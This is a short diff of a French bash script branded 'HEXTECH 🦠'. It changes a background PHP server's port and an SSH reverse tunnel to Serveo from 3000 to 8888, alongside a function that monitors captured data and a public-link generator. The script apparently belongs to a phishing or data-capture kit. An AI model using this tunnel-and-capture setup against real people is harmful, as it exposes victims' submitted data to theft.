@@ -40,7 +40,7 @@ surveiller_donnees() {
 # Fonction pour démarrer le serveur PHP
 demarrer_serveur_php() {
     echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
-    php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
+    php -S localhost:8888 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
     sleep 2 # Attendre que le serveur démarre
     surveiller_donnees & # Démarrer la surveillance en arrière-plan
 }
@@ -89,7 +89,7 @@ generer_lien_ngrok() {
 # Fonction pour générer un lien avec Serveo
 generer_lien_serveo() {
     echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo pour générer un lien public...${NC}"
-    ssh -R 80:localhost:3000 serveo.net -p 22 || {
+    ssh -R 80:localhost:8888 serveo.net -p 22 || {
         echo -e "${ROUGE}[!] Échec de la connexion à Serveo. Vérifiez votre connexion internet.${NC}"
     }
 }
